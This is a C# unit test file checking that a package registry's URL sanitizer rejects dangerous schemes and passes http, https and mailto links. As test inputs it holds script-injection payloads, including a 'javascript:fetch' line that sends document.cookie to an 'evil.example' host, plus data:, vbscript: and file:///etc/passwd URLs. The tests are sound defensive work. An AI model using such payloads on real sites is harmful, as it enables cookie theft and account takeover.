using Stash.Registry.Web.Rendering;
using Xunit;

namespace Stash.Tests.Registry.Web;

/// <summary>
/// Unit tests for <see cref="SafeUrl.AllowExternal"/>: the render-time gate that
/// rejects package-authored URLs with dangerous schemes (<c>javascript:</c>, <c>data:</c>,
/// <c>vbscript:</c>, <c>file:</c>, etc.) and passes only http/https/mailto through.
/// </summary>
public sealed class SafeUrlTests
{
    // ── Dangerous schemes — must return null ─────────────────────────────────

    [Theory]
    [InlineData("javascript:alert(1)")]
    [InlineData("javascript:fetch('https://evil.example/'+document.cookie)")]
    [InlineData("JAVASCRIPT:alert(1)")]   // scheme matching is case-insensitive
    public void AllowExternal_JavascriptScheme_ReturnsNull(string url)
    {
        Assert.Null(SafeUrl.AllowExternal(url));
    }

    [Theory]
    [InlineData("data:text/html,<script>alert(1)</script>")]
    [InlineData("data:text/plain;base64,aGVsbG8=")]
    public void AllowExternal_DataScheme_ReturnsNull(string url)
    {
        Assert.Null(SafeUrl.AllowExternal(url));
    }

    [Theory]
    [InlineData("vbscript:MsgBox(1)")]
    [InlineData("file:///etc/passwd")]
    public void AllowExternal_OtherDangerousSchemes_ReturnNull(string url)
    {
        Assert.Null(SafeUrl.AllowExternal(url));
    }

    // ── Relative / scheme-less — must return null ─────────────────────────────

    [Theory]
    [InlineData("relative/path")]
    [InlineData("/absolute/but/no/scheme")]
    [InlineData("//example.com/protocol-relative")]
    [InlineData("not-a-url")]
    public void AllowExternal_SchemeLessOrRelative_ReturnsNull(string url)
    {
        Assert.Null(SafeUrl.AllowExternal(url));
    }

    // ── Null / whitespace — must return null ─────────────────────────────────

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void AllowExternal_NullOrWhitespace_ReturnsNull(string? url)
    {
        Assert.Null(SafeUrl.AllowExternal(url));
    }

    // ── Allowed schemes — must round-trip unchanged ───────────────────────────

    [Theory]
    [InlineData("https://github.com/org/repo")]
    [InlineData("http://example.com/project")]
    [InlineData("https://example.com/path?q=1&r=2")]
    public void AllowExternal_HttpsOrHttp_ReturnsUrlUnchanged(string url)
    {
        Assert.Equal(url, SafeUrl.AllowExternal(url));
    }

    [Fact]
    public void AllowExternal_MailtoScheme_ReturnsUrlUnchanged()
    {
        const string url = "mailto:owner@example.com";
        Assert.Equal(url, SafeUrl.AllowExternal(url));
    }
}
